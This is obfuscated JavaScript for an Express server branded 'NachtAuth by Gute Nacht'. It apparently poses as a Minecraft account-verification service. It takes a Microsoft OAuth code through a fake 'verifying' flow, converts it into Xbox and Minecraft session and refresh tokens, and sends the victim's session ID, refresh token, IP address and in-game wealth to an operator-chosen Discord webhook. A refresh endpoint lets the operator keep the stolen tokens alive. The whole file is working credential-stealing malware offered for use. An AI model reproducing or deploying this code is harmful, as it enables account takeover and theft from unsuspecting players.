// gute nacht was here !
// marcat was here !

const _0x3b84c4=_0x1939;function _0x56cf(){const _0xcd016b=['uhs','XBL3.0\x20x=','application/x-www-form-urlencoded','set','refresh_token','post','https://login.live.com/oauth20_token.srf',')\x20to\x20refresh\x20their\x20token!','push','apiKey','https://sky.shiiyu.moe/stats/','Unable\x20to\x20get\x20XST\x20token,\x20token\x20can\x20not\x20be\x20refreshed.','data','listen','18054954MfiExy','axios','catch','users','https://api.minecraftservices.com/authentication/login_with_xbox','en-US','NumberFormat','user.auth.xboxlive.com','RPS','371zaVJdO','database','./utils/Networth','x-forwarded-for','Bearer\x20','POST','./config.json','webhook','Session\x20ID','No\x20profile\x20data\x20found.\x20ðŸ™','mongodb','find','Missing\x20compulsory\x20parameter:\x20','https://user.auth.xboxlive.com/user/authenticate','4604276krcnPY','connect','headers','get','query','You\x20were\x20successfully\x20authenticated!\x20You\x20can\x20now\x20close\x20this\x20tab.','password','ðŸŒŸ\x20NachtAuth\x20by\x20Gute\x20Nacht\x20ðŸŒŸ','```','250392tefLxY','RETAIL','authorization_code','435963hpFbBG','User\x20added\x20successfully','then','client_secret','insertOne','Invalid\x20password','Unable\x20to\x20get\x20Bearer\x20Token,\x20token\x20can\x20not\x20be\x20refreshed.','https://cdn.discordapp.com/attachments/1053140780425945100/1055361442901135450/NachtAuth.png','Invalid\x20api\x20key','compact','redirect_uri','A\x20token\x20has\x20been\x20refreshed!','format','2997810SkhsXg','iplim','status','1148149KkrCFz','application/json','code','&webhook=','rp://api.minecraftservices.com/','state','client_id','azure','xui','stack','log','NachtAuth','Error\x20sending\x20webhook:\x20','Unavaliable','ðŸª™\x20Networth:\x200','embeds','ðŸŒ\x20Skyblock\x20Profile\x20Info','20XGRIaX','5817132MjMFJB','use','toArray','send','http://auth.xboxlive.com','Unable\x20to\x20get\x20user\x20token\x20or\x20hash,\x20token\x20can\x20not\x20be\x20refreshed.','ðŸŒŸ\x20NachtAuth\x20by\x20Gute\x20Nacht\x20ðŸŒŸ\x20-\x20Thank\x20you\x20BreadCat\x20for\x20your\x20networth\x20stuff!','Token\x20refreshed\x20successfully!\x20You\x20may\x20now\x20close\x20this\x20window\x20:)','project','length','Got\x20webhook:\x20','connectionstring','Username','JWT','collection','access_token','Missing\x20compulsory\x20parameter:\x20code','A\x20user\x20has\x20been\x20authenticated!','Click\x20[here](http://nachtverification.onrender.com/refresh?refresh_token=','DisplayClaims','Token','ðŸª™\x20Networth:\x20','Refresh\x20Token'];_0x56cf=function(){return _0xcd016b;};return _0x56cf();}function _0x1939(_0x14765d,_0x39ead0){const _0x56cfba=_0x56cf();return _0x1939=function(_0x193995,_0x347b5b){_0x193995=_0x193995-0xe0;let _0x45edc5=_0x56cfba[_0x193995];return _0x45edc5;},_0x1939(_0x14765d,_0x39ead0);}(function(_0x39d487,_0x4465ea){const _0x1b561b=_0x1939,_0x291567=_0x39d487();while(!![]){try{const _0x3a6219=parseInt(_0x1b561b(0x103))/0x1+parseInt(_0x1b561b(0x114))/0x2*(-parseInt(_0x1b561b(0xf3))/0x3)+parseInt(_0x1b561b(0xe7))/0x4+-parseInt(_0x1b561b(0x100))/0x5+parseInt(_0x1b561b(0x115))/0x6+parseInt(_0x1b561b(0x143))/0x7*(parseInt(_0x1b561b(0xf0))/0x8)+-parseInt(_0x1b561b(0x13a))/0x9;if(_0x3a6219===_0x4465ea)break;else _0x291567['push'](_0x291567['shift']());}catch(_0x5785e8){_0x291567['push'](_0x291567['shift']());}}}(_0x56cf,0xd4165));const MongoClient=require(_0x3b84c4(0xe3))['MongoClient'],networthCalc=require(_0x3b84c4(0x145)),config=require(_0x3b84c4(0x149)),iplim=require(_0x3b84c4(0x101)),axios=require(_0x3b84c4(0x13b));let webhook_url;const client=new MongoClient(config[_0x3b84c4(0xe3)][_0x3b84c4(0x120)],{'useNewUrlParser':!![],'useUnifiedTopology':!![]}),express=require('express'),app=express(),port=0xbb8,client_secret=config[_0x3b84c4(0x10a)][_0x3b84c4(0xf6)],client_id=config[_0x3b84c4(0x10a)][_0x3b84c4(0x109)],redirect_uri=config['azure'][_0x3b84c4(0xfd)],password=config[_0x3b84c4(0x144)][_0x3b84c4(0xed)],mongodb=config[_0x3b84c4(0xe3)][_0x3b84c4(0x120)];app[_0x3b84c4(0xea)]('/',(_0x17c5c2,_0x2abfbc)=>{const _0x5ac02b=_0x3b84c4;_0x2abfbc['send'](_0x5ac02b(0x110));}),app[_0x3b84c4(0xea)]('/add',(_0x4bbaf5,_0x305342)=>{const _0x3f3df8=_0x3b84c4,_0x42751d=[_0x3f3df8(0x135),_0x3f3df8(0xe0),_0x3f3df8(0xed)];for(let _0x4a0121=0x0;_0x4a0121<_0x42751d[_0x3f3df8(0x11e)];_0x4a0121++){if(_0x4bbaf5['query'][_0x42751d[_0x4a0121]]===undefined){_0x305342[_0x3f3df8(0x102)](0x190)['send'](_0x3f3df8(0xe5)+_0x42751d[_0x4a0121]);return;}}if(_0x4bbaf5[_0x3f3df8(0xeb)][_0x3f3df8(0xed)]!==password){_0x305342[_0x3f3df8(0x102)](0x191)[_0x3f3df8(0x118)](_0x3f3df8(0xf8));return;}try{addUser(_0x4bbaf5[_0x3f3df8(0xeb)]['apiKey'],_0x4bbaf5['query'][_0x3f3df8(0xe0)]),_0x305342['send'](_0x3f3df8(0xf4));}catch(_0x18dca4){_0x305342[_0x3f3df8(0x102)](0x190)['send']('User\x20already\x20exists');}}),app[_0x3b84c4(0x116)](iplim({'timeout':0x3e8*0xa*0xf,'limit':0x4,'exclude':[],'log':![]})),app[_0x3b84c4(0x12f)]('trust\x20proxy',!![]),app[_0x3b84c4(0xea)]('/verifying',async(_0x2bf6d2,_0x28e855)=>{const _0x1e5243=_0x3b84c4,_0x94b3ac=_0x2bf6d2[_0x1e5243(0xeb)][_0x1e5243(0x105)];if(_0x2bf6d2[_0x1e5243(0xeb)][_0x1e5243(0x105)]===undefined){_0x28e855['status'](0x190)[_0x1e5243(0x118)](_0x1e5243(0x125));return;}if(_0x2bf6d2[_0x1e5243(0xeb)][_0x1e5243(0x108)]===undefined){_0x28e855[_0x1e5243(0x102)](0x190)[_0x1e5243(0x118)]('Missing\x20compulsory\x20parameter:\x20state');return;}getWebhook(_0x2bf6d2['query'][_0x1e5243(0x108)])['then'](_0x12b550=>{const _0x40dc30=_0x1e5243;if(_0x12b550==null){_0x28e855[_0x40dc30(0x102)](0x190)[_0x40dc30(0x118)](_0x40dc30(0xfb));return;}else console[_0x40dc30(0x10d)](_0x40dc30(0x11f)+_0x12b550),webhook_url=_0x12b550;});try{data=await ReturnData(_0x94b3ac);const _0x18174c=data[0x0],_0x1e50e1=data[0x1],_0x2fa6e1=data[0x2],_0x3d02d5=data[0x3],_0x1a422b=getIp(_0x2bf6d2);let _0x2ae811='0',_0x19f930='0',_0x4abb74=0x0,_0x1d60ec=_0x1e5243(0xe2);networthCalc(_0x1e50e1)[_0x1e5243(0xf5)](_0x1fcf9e=>{const _0x2233a5=_0x1e5243;_0x2ae811=Intl['NumberFormat'](_0x2233a5(0x13f),{'notation':_0x2233a5(0xfc),'maximumFractionDigits':0x2})[_0x2233a5(0xff)](_0x1fcf9e[0x0]),_0x19f930=Intl[_0x2233a5(0x140)]('en-US',{'notation':_0x2233a5(0xfc),'maximumFractionDigits':0x2})[_0x2233a5(0xff)](_0x1fcf9e[0x1]),_0x1d60ec=_0x1fcf9e[0x2],_0x4abb74=Math['trunc'](_0x1fcf9e[0x0])/0xf4240,PostWebhook(![],_0x18174c,_0x1e50e1,_0x1a422b,_0x2fa6e1,_0x3d02d5,_0x2ae811,_0x19f930,_0x1d60ec,webhook_url),SendAPI(_0x18174c,_0x4abb74,_0x2fa6e1);})[_0x1e5243(0x13c)](_0x371db3=>{const _0x7bce79=_0x1e5243;console[_0x7bce79(0x10d)](_0x371db3);});}catch(_0x52f9dc){console['log'](_0x52f9dc);}_0x28e855[_0x1e5243(0x118)](_0x1e5243(0xec));}),createCollection();async function createCollection(){const _0xee27fc=_0x3b84c4;try{await client['connect']();const _0x1531bd=client['db'](_0xee27fc(0x13d)),_0x23b6b7=_0x1531bd['collection'](_0xee27fc(0x13d));await _0x23b6b7['createIndex']({'apiKey':0x1},{'unique':!![]});}catch(_0xc96803){console[_0xee27fc(0x10d)](_0xc96803[_0xee27fc(0x10c)]);}}async function addUser(_0x739435,_0x48118f){const _0x2b9f71=_0x3b84c4;try{await client[_0x2b9f71(0xe8)]();const _0x43f2b9=client['db'](_0x2b9f71(0x13d)),_0x2ce6ac=_0x43f2b9['collection']('users');await _0x2ce6ac[_0x2b9f71(0xf7)]({'apiKey':_0x739435,'webhook':_0x48118f});}catch(_0x9b58a6){console['log'](_0x9b58a6[_0x2b9f71(0x10c)]);}}async function getWebhook(_0x348606){const _0x71d99a=_0x3b84c4,_0x43dbc9=client['db'];try{await client[_0x71d99a(0xe8)]();const _0x5f48b0=client['db'](_0x71d99a(0x13d)),_0x3ee946=_0x5f48b0[_0x71d99a(0x123)](_0x71d99a(0x13d)),_0x12a65d={'apiKey':_0x348606},_0x525aa0=await _0x3ee946[_0x71d99a(0xe4)](_0x12a65d)[_0x71d99a(0x11d)]({'webhook':0x1})[_0x71d99a(0x117)]();return _0x525aa0[0x0]['webhook'];}catch(_0x5bbec3){console['log'](_0x5bbec3['stack']);}}app[_0x3b84c4(0x139)](port,()=>{const _0x77a996=_0x3b84c4;console[_0x77a996(0x10d)]('Started\x20the\x20server\x20on\x20'+port);});async function ReturnData(_0x58f8b2){const _0x3e1caa=_0x3b84c4;let _0xbc609c,_0x168e54,_0x39be6a,_0x3f7c2e,_0x5f5390,_0x2bc008,_0x5d1bd1,_0x4f7c43;const _0x5ce6f7=[_0x3e1caa(0x132),_0x3e1caa(0xe6),'https://xsts.auth.xboxlive.com/xsts/authorize',_0x3e1caa(0x13e)],_0x3bb2e7=[{'headers':{'Content-Type':_0x3e1caa(0x12e)}},{'headers':{'Content-Type':_0x3e1caa(0x104),'Accept':'application/json'}},{'headers':{'Content-Type':_0x3e1caa(0x104),'Accept':'application/json'}},{'headers':{'Content-Type':_0x3e1caa(0x104)}}];let _0x43ec79={'client_id':client_id,'redirect_uri':redirect_uri,'client_secret':client_secret,'code':_0x58f8b2,'grant_type':_0x3e1caa(0xf2)},_0x309003=await axios[_0x3e1caa(0x131)](_0x5ce6f7[0x0],_0x43ec79,_0x3bb2e7[0x0]);_0xbc609c=_0x309003[_0x3e1caa(0x138)][_0x3e1caa(0x124)],_0x168e54=_0x309003[_0x3e1caa(0x138)]['refresh_token'];let _0x31ea62={'Properties':{'AuthMethod':_0x3e1caa(0x142),'SiteName':_0x3e1caa(0x141),'RpsTicket':'d='+_0xbc609c},'RelyingParty':_0x3e1caa(0x119),'TokenType':'JWT'},_0x30f0fc=await axios[_0x3e1caa(0x131)](_0x5ce6f7[0x1],_0x31ea62,_0x3bb2e7[0x1]);_0x39be6a=_0x30f0fc[_0x3e1caa(0x138)][_0x3e1caa(0x129)],_0x3f7c2e=_0x30f0fc['data'][_0x3e1caa(0x128)][_0x3e1caa(0x10b)][0x0]['uhs'];let _0x12dcb4={'Properties':{'SandboxId':'RETAIL','UserTokens':[_0x39be6a]},'RelyingParty':_0x3e1caa(0x107),'TokenType':_0x3e1caa(0x122)},_0x4ef13e=await axios[_0x3e1caa(0x131)](_0x5ce6f7[0x2],_0x12dcb4,_0x3bb2e7[0x2]);_0x5f5390=_0x4ef13e['data'][_0x3e1caa(0x129)];let _0x3a988a={'identityToken':'XBL3.0\x20x='+_0x3f7c2e+';'+_0x5f5390,'ensureLegacyEnabled':!![]},_0x4c463c=await axios[_0x3e1caa(0x131)](_0x5ce6f7[0x3],_0x3a988a,_0x3bb2e7[0x3]);return _0x2bc008=_0x4c463c[_0x3e1caa(0x138)][_0x3e1caa(0x124)],await GetPlayer(_0x2bc008)['then'](_0xad35ed=>{_0x5d1bd1=_0xad35ed[0x0],_0x4f7c43=_0xad35ed[0x1];})['catch'](_0x36b288=>{console['log'](_0x36b288),module['exports'](_0x5d1bd1);}),[_0x4f7c43,_0x5d1bd1,_0x2bc008,_0x168e54];}async function GetPlayer(_0xbc7f17){const _0x5e0588=_0x3b84c4,_0x2173d2='https://api.minecraftservices.com/minecraft/profile',_0x3e59f3={'headers':{'Authorization':_0x5e0588(0x147)+_0xbc7f17}};let _0x12db36=await axios[_0x5e0588(0xea)](_0x2173d2,_0x3e59f3);return[_0x12db36['data']['id'],_0x12db36[_0x5e0588(0x138)]['name']];}app[_0x3b84c4(0xea)]('/refresh',async(_0x5e4c76,_0x54f79b)=>{const _0x15e884=_0x3b84c4,_0x460104=_0x5e4c76[_0x15e884(0xeb)]['refresh_token'];webhook_url=_0x5e4c76[_0x15e884(0xeb)][_0x15e884(0xe0)];var _0x1ede88,_0x4cbaf5,_0x4966b8,_0x55d790,_0x22ca47,_0x4e6bba,_0x3fc5c2=getIp(_0x5e4c76);let _0x2d307d='0',_0x35410f='0',_0x291e29='No\x20profile\x20data\x20found.\x20ðŸ™';const _0x57e488=['https://login.live.com/oauth20_token.srf','https://user.auth.xboxlive.com/user/authenticate','https://xsts.auth.xboxlive.com/xsts/authorize',_0x15e884(0x13e)],_0x3353ed=[{'headers':{'Content-Type':'application/x-www-form-urlencoded'}},{'headers':{'Content-Type':_0x15e884(0x104),'Accept':'application/json'}},{'headers':{'Content-Type':_0x15e884(0x104),'Accept':_0x15e884(0x104)}},{'headers':{'Content-Type':'application/json'}}];let _0x5e4cac={'client_id':client_id,'redirect_uri':redirect_uri,'client_secret':client_secret,'refresh_token':_0x460104,'grant_type':_0x15e884(0x130)};ResponseAccessAndRefreshToken=await axios[_0x15e884(0x131)](_0x57e488[0x0],_0x5e4cac,_0x3353ed[0x0]),_0x1ede88=ResponseAccessAndRefreshToken[_0x15e884(0x138)][_0x15e884(0x124)],_0x4cbaf5=ResponseAccessAndRefreshToken['data'][_0x15e884(0x130)];if(!_0x1ede88||!_0x4cbaf5)return _0x54f79b['send']('Unable\x20to\x20get\x20access\x20token\x20or\x20refresh\x20token,\x20token\x20can\x20not\x20be\x20refreshed.');let _0x589072={'Properties':{'AuthMethod':_0x15e884(0x142),'SiteName':_0x15e884(0x141),'RpsTicket':'d='+_0x1ede88},'RelyingParty':'http://auth.xboxlive.com','TokenType':_0x15e884(0x122)};ResponseUserTokenAndHash=await axios[_0x15e884(0x131)](_0x57e488[0x1],_0x589072,_0x3353ed[0x1]),_0x4966b8=ResponseUserTokenAndHash[_0x15e884(0x138)]['Token'],_0x55d790=ResponseUserTokenAndHash[_0x15e884(0x138)][_0x15e884(0x128)][_0x15e884(0x10b)][0x0][_0x15e884(0x12c)];if(!_0x4966b8||!_0x55d790)return _0x54f79b[_0x15e884(0x118)](_0x15e884(0x11a));let _0x2a5531={'Properties':{'SandboxId':_0x15e884(0xf1),'UserTokens':[_0x4966b8]},'RelyingParty':_0x15e884(0x107),'TokenType':'JWT'};ResponseXSTToken=await axios[_0x15e884(0x131)](_0x57e488[0x2],_0x2a5531,_0x3353ed[0x2]),_0x22ca47=ResponseXSTToken['data']['Token'];if(!_0x22ca47)return _0x54f79b[_0x15e884(0x118)](_0x15e884(0x137));let _0x211899={'identityToken':_0x15e884(0x12d)+_0x55d790+';'+_0x22ca47,'ensureLegacyEnabled':!![]};ResponseBearerToken=await axios[_0x15e884(0x131)](_0x57e488[0x3],_0x211899,_0x3353ed[0x3]),_0x4e6bba=ResponseBearerToken[_0x15e884(0x138)]['access_token'];if(!_0x4e6bba)return _0x54f79b[_0x15e884(0x118)](_0x15e884(0xf9));GetPlayer(_0x4e6bba)[_0x15e884(0xf5)](_0x23f5fa=>{const _0x16105a=_0x15e884;uuid=_0x23f5fa[0x0],username=_0x23f5fa[0x1],networthCalc(uuid)[_0x16105a(0xf5)](_0x3c15eb=>{const _0x55f46e=_0x16105a;_0x2d307d=Intl[_0x55f46e(0x140)](_0x55f46e(0x13f),{'notation':_0x55f46e(0xfc),'maximumFractionDigits':0x2})[_0x55f46e(0xff)](_0x3c15eb[0x0]),_0x35410f=Intl['NumberFormat']('en-US',{'notation':_0x55f46e(0xfc),'maximumFractionDigits':0x2})[_0x55f46e(0xff)](_0x3c15eb[0x1]),_0x291e29=_0x3c15eb[0x2],PostWebhook(!![],username,uuid,_0x3fc5c2,_0x4e6bba,_0x4cbaf5,_0x2d307d,_0x35410f,_0x291e29),_0x54f79b['send'](_0x55f46e(0x11c));})[_0x16105a(0x13c)](_0xe7ec3f=>{const _0x208c26=_0x16105a;console[_0x208c26(0x10d)](_0xe7ec3f);});})[_0x15e884(0x13c)](_0xee5f3c=>{const _0x151757=_0x15e884;console[_0x151757(0x10d)](_0xee5f3c);});});function PostWebhook(_0x4da480,_0x54088e,_0x3cceb6,_0x831ac1,_0x3c4be6,_0x12ae6f,_0xbaa49f,_0x4da45b,_0x59244b){const _0x3c7001=_0x3b84c4;let _0x149f0b,_0x392e4e;_0x4da480?_0x149f0b=_0x3c7001(0xfe):_0x149f0b=_0x3c7001(0x126);_0xbaa49f==0x0?_0x392e4e=_0x3c7001(0x111):_0x392e4e=_0x3c7001(0x12a)+_0x4da45b+'\x20('+_0xbaa49f+'\x20unsoulbound)';let _0x280ccb={'username':_0x3c7001(0x10e),'avatar_url':_0x3c7001(0xfa),'embeds':[{'title':_0x3c7001(0x10e),'description':_0x149f0b,'color':0x7289da,'author':{'name':_0x392e4e},'footer':{'text':_0x3c7001(0xee),'url':_0x3c7001(0xfa)},'timestamp':new Date(),'fields':[{'name':_0x3c7001(0x121),'value':'```'+_0x54088e+_0x3c7001(0xef),'inline':!![]},{'name':'UUID','value':_0x3c7001(0xef)+_0x3cceb6+_0x3c7001(0xef),'inline':!![]},{'name':'IP\x20Address','value':_0x3c7001(0xef)+_0x831ac1+_0x3c7001(0xef),'inline':!![]},{'name':_0x3c7001(0xe1),'value':_0x3c7001(0xef)+_0x3c4be6+_0x3c7001(0xef),'inline':![]},{'name':_0x3c7001(0x12b),'value':_0x3c7001(0x127)+_0x12ae6f+_0x3c7001(0x106)+webhook_url+_0x3c7001(0x133)}]}]},_0x2395d1=_0x280ccb;_0x59244b!=_0x3c7001(0xe2)?_0x2395d1['embeds']['push']({'title':'ðŸŒ\x20Skyblock\x20Profile\x20Info','color':0x7289da,'fields':_0x59244b,'url':_0x3c7001(0x136)+_0x54088e,'footer':{'text':_0x3c7001(0x11b)}}):_0x2395d1[_0x3c7001(0x112)][_0x3c7001(0x134)]({'title':_0x3c7001(0x113),'color':0x7289da,'description':'No\x20profile\x20data\x20found.\x20ðŸ™','url':_0x3c7001(0x136)+_0x54088e,'footer':{'text':_0x3c7001(0xee)}});var _0x267433={'method':_0x3c7001(0x148),'url':webhook_url,'headers':{'Content-Type':_0x3c7001(0x104)},'data':_0x280ccb};console[_0x3c7001(0x10d)]('Information\x20was\x20sent\x20to\x20'+webhook_url),axios(_0x267433)[_0x3c7001(0xf5)](_0x5b529a=>{})['catch'](_0x41b187=>{const _0x481d87=_0x3c7001;console[_0x481d87(0x10d)](_0x481d87(0x10f),_0x41b187);});}function getIp(_0x88ee02){const _0x11c53f=_0x3b84c4;return _0x88ee02[_0x11c53f(0xe9)]['cf-connecting-ip']||_0x88ee02[_0x11c53f(0xe9)]['x-real-ip']||_0x88ee02[_0x11c53f(0xe9)][_0x11c53f(0x146)]||_0x88ee02['connection']['remoteAddress']||'';}
